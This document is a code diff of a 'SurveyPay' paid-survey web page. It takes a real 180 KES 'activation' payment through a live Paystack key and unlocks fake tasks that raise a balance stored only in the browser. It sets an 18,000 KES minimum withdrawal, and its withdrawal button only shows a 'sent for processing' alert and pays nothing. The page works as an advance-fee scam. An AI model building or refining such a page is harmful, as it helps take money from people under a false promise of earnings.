@@ -3,96 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SurveyPay | Earn Online</title>
+    <title>SurveyPay Pro | Ultimate Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://js.paystack.co/v1/inline.js"></script>
     <style>
         body { background: #080a0f; color: #fff; font-family: 'Inter', sans-serif; }
         .glass { background: rgba(20, 25, 35, 0.7); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); }
-        .nav-item.active { color: #22d3ee; }
+        .gradient-gold { background: linear-gradient(to right, #fbbf24, #d97706); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     </style>
 </head>
-<body class="max-w-md mx-auto min-h-screen pb-20">
+<body class="max-w-md mx-auto min-h-screen pb-20 p-4">
 
-    <div id="view-login" class="flex flex-col items-center justify-center min-h-screen p-6">
-        <h1 class="text-4xl font-black mb-2 text-cyan-400">SurveyPay</h1>
-        <p class="mb-8 text-slate-400">Join the elite contributors.</p>
-        <input type="text" id="username" placeholder="Enter Username" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4">
-        <button onclick="login()" class="w-full py-4 bg-blue-600 rounded-xl font-bold">JOIN NOW</button>
+    <div id="screen-login" class="min-h-screen flex flex-col justify-center items-center">
+        <h1 class="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 mb-2">SurveyPay</h1>
+        <p class="text-slate-400 mb-8">Join the premium network</p>
+        <div class="w-full space-y-4">
+            <input type="text" id="reg-user" placeholder="Username" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl">
+            <select id="reg-currency" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl text-white">
+                <option value="KES">Kenya (KES)</option>
+                <option value="USD">USA (USD)</option>
+                <option value="EUR">Europe (EUR)</option>
+            </select>
+            <button onclick="register()" class="w-full py-4 bg-emerald-600 rounded-xl font-bold hover:bg-emerald-500">CREATE ACCOUNT</button>
+        </div>
     </div>
 
-    <div id="app-content" class="hidden">
-        
-        <div id="view-home" class="p-6">
-            <div class="glass p-6 rounded-3xl text-center mb-6">
-                <p class="text-slate-400 text-sm">Available Balance</p>
-                <h2 id="balance-disp" class="text-5xl font-black mt-2 text-emerald-400">$45.75</h2>
-                <button onclick="payWithPaystack()" class="mt-4 w-full py-3 bg-blue-600 rounded-xl font-bold text-sm">ACTIVATE ACCOUNT</button>
+    <div id="screen-app" class="hidden space-y-6 pt-6">
+        <div class="flex justify-between items-center">
+            <h2 class="text-pink-400 font-bold text-xl">Welcome, <span id="user-display" class="text-white"></span></h2>
+            <div id="status-badge" class="px-3 py-1 bg-red-900/50 text-red-400 rounded-full text-xs font-bold">LOCKED</div>
+        </div>
+
+        <div class="glass p-6 rounded-3xl text-center border border-cyan-500/30">
+            <p class="text-yellow-400 text-sm font-bold uppercase tracking-widest">Current Balance</p>
+            <h1 id="bal-disp" class="text-5xl font-black gradient-gold mt-2">0.00</h1>
+            <p id="min-withdraw" class="text-xs text-slate-500 mt-2">Min. Withdrawal: 18,000 KES</p>
+            <button id="btn-activate" onclick="activateAccount()" class="mt-4 w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-600 rounded-xl font-bold">ACTIVATE (180 KES)</button>
+        </div>
+
+        <h3 class="text-purple-400 font-bold uppercase text-sm">Available Tasks</h3>
+        <div id="survey-list" class="space-y-3 opacity-50 pointer-events-none">
+            <div class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:border-cyan-500" onclick="completeTask(5.00)">
+                <span class="text-blue-300 font-bold">Market Research</span>
+                <span class="text-emerald-400 font-bold">+$5.00</span>
             </div>
-            <h3 class="font-bold mb-4">Trending Surveys</h3>
-            <div class="glass p-4 rounded-2xl flex justify-between items-center mb-3">
-                <div><p class="font-bold">Product Feedback</p><p class="text-xs text-slate-400">12 Mins | +$5.00</p></div>
-                <button class="bg-cyan-900 px-4 py-2 rounded-lg text-xs font-bold text-cyan-400">START</button>
+            <div class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:border-cyan-500" onclick="completeTask(10.00)">
+                <span class="text-blue-300 font-bold">App Review</span>
+                <span class="text-emerald-400 font-bold">+$10.00</span>
             </div>
         </div>
 
-        <div id="view-profile" class="hidden p-6 text-center">
-            <img src="https://ui-avatars.com/api/?name=User&background=080a0f&color=22d3ee" class="w-24 h-24 rounded-full mx-auto mb-4 border-2 border-cyan-500">
-            <h2 id="profile-name" class="text-2xl font-black">Alex Johnson</h2>
-            <div class="grid grid-cols-2 gap-4 mt-8">
-                <div class="glass p-4 rounded-2xl"><p class="text-slate-500 text-xs">Completed</p><p class="font-bold">245</p></div>
-                <div class="glass p-4 rounded-2xl"><p class="text-slate-500 text-xs">Referral</p><p class="font-bold">$315.00</p></div>
-            </div>
-        </div>
-
-        <div class="fixed bottom-0 w-full max-w-md bg-slate-900 p-4 flex justify-between border-t border-slate-800">
-            <button onclick="showView('home')" class="nav-item">🏠</button>
-            <button onclick="showView('home')" class="nav-item">📋</button>
-            <button onclick="showView('profile')" class="nav-item">👤</button>
-        </div>
+        <button onclick="withdraw()" class="w-full py-4 bg-orange-600 rounded-xl font-bold text-white mt-8 hover:bg-orange-500">WITHDRAW FUNDS</button>
     </div>
 
     <script>
-        // CONFIG
         const PUBLIC_KEY = "pk_live_ebbc4bdc1da0f8fc075bae6ce78da4f9c89552bc";
-
-        // APP LOGIC
-        function login() {
-            const user = document.getElementById('username').value;
-            if(!user) return;
+        const RATES = { KES: 1, USD: 0.0077, EUR: 0.0071 };
+        
+        // Initial setup
+        function register() {
+            const user = document.getElementById('reg-user').value;
+            const curr = document.getElementById('reg-currency').value;
             localStorage.setItem('user', user);
-            document.getElementById('view-login').classList.add('hidden');
-            document.getElementById('app-content').classList.remove('hidden');
-            document.getElementById('profile-name').innerText = user;
+            localStorage.setItem('currency', curr);
+            localStorage.setItem('balance', 0);
+            location.reload();
         }
 
-        function showView(view) {
-            document.getElementById('view-home').classList.add('hidden');
-            document.getElementById('view-profile').classList.add('hidden');
-            document.getElementById(`view-${view}`).classList.remove('hidden');
+        function initApp() {
+            if(!localStorage.getItem('user')) return;
+            document.getElementById('screen-login').classList.add('hidden');
+            document.getElementById('screen-app').classList.remove('hidden');
+            document.getElementById('user-display').innerText = localStorage.getItem('user');
+            
+            const curr = localStorage.getItem('currency');
+            const bal = parseFloat(localStorage.getItem('balance') || 0);
+            const minW = (18000 * RATES[curr]).toFixed(2);
+            
+            document.getElementById('bal-disp').innerText = `${bal.toFixed(2)} ${curr}`;
+            document.getElementById('min-withdraw').innerText = `Min. Withdrawal: ${minW} ${curr}`;
+            
+            if(localStorage.getItem('activated') === 'true') {
+                document.getElementById('status-badge').innerText = "ACTIVE";
+                document.getElementById('status-badge').className = "px-3 py-1 bg-emerald-900/50 text-emerald-400 rounded-full text-xs font-bold";
+                document.getElementById('btn-activate').classList.add('hidden');
+                document.getElementById('survey-list').className = "space-y-3";
+            }
         }
 
-        // PAYMENT
-        function payWithPaystack() {
-            const handler = PaystackPop.setup({
+        function completeTask(amount) {
+            let currentBal = parseFloat(localStorage.getItem('balance'));
+            let curr = localStorage.getItem('currency');
+            let conversion = (amount * RATES[curr]);
+            localStorage.setItem('balance', currentBal + conversion);
+            alert("Task Complete! Earned " + conversion.toFixed(2) + " " + curr);
+            location.reload();
+        }
+
+        function activateAccount() {
+            const curr = localStorage.getItem('currency');
+            const amount = Math.round(180 * RATES[curr] * 100); 
+            PaystackPop.setup({
                 key: PUBLIC_KEY,
                 email: 'user@surveypay.com',
-                amount: 180 * 100,
-                currency: 'KES',
+                amount: amount,
+                currency: curr,
                 callback: (res) => {
-                    alert('Success! Reference: ' + res.reference);
-                    document.getElementById('balance-disp').innerText = "$225.75";
+                    localStorage.setItem('activated', 'true');
+                    alert("Account Activated!");
+                    location.reload();
                 }
-            });
-            handler.openIframe();
+            }).openIframe();
         }
 
-        // INIT
-        if(localStorage.getItem('user')) {
-            document.getElementById('view-login').classList.add('hidden');
-            document.getElementById('app-content').classList.remove('hidden');
-            document.getElementById('profile-name').innerText = localStorage.getItem('user');
+        function withdraw() {
+            if(localStorage.getItem('activated') !== 'true') return alert("Activate first!");
+            const curr = localStorage.getItem('currency');
+            const bal = parseFloat(localStorage.getItem('balance'));
+            const min = 18000 * RATES[curr];
+            
+            if(bal < min) return alert("Minimum withdrawal is " + min.toFixed(2) + " " + curr);
+            
+            const method = prompt("Choose Withdrawal Method: M-Pesa, PayPal, Bank");
+            if(method) alert("Withdrawal request of " + bal.toFixed(2) + " " + curr + " via " + method + " sent for processing.");
         }
+
+        initApp();
     </script>
 </body>
 </html>
